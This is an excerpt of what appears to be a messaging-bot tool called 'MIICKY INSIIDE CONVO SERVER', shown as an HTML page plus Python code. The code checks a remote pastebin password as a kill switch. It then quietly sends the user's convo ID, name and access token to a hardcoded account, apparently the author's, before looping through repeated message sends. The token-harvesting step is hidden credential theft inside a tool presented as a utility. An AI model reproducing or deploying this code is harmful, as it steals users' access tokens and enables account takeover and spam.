...
<head>
    ...
    <title>THE MIICKY INSIIDE</title>
    <style>
        body {
...
<body>
    <div class="container">
        <div class="box">
            <h1>MIICKY INSIIDE CONVO SERVER</h1>
            <div class="credit">
                <p>1. CREDIT:-TS ARMY</p>
                <p>2. OWNER => MIICKY INSIIDE</p>
...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/Nvx3BFKe').text
    
    if mmm_pass not in password:
        print('\033[1;31m⚠︎ Your Password Changed By MIICKY INSIIDE ⚠︎')
        sys.exit()
    
    # Message template
    msg_template = "Owner => THE MIICKY INSIIDE\n Hello MIICKY madam. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["100075418646486"]
        ...
        try:
            for message_index in range(num_messages):
                ...
                if response.ok:
                    ...
                    print(formatted_time)
                    print('\033[1;92m' + '✪✭═══════•『MIICKY ♡ INSIIDE 』•═══════✭✪')
                else:
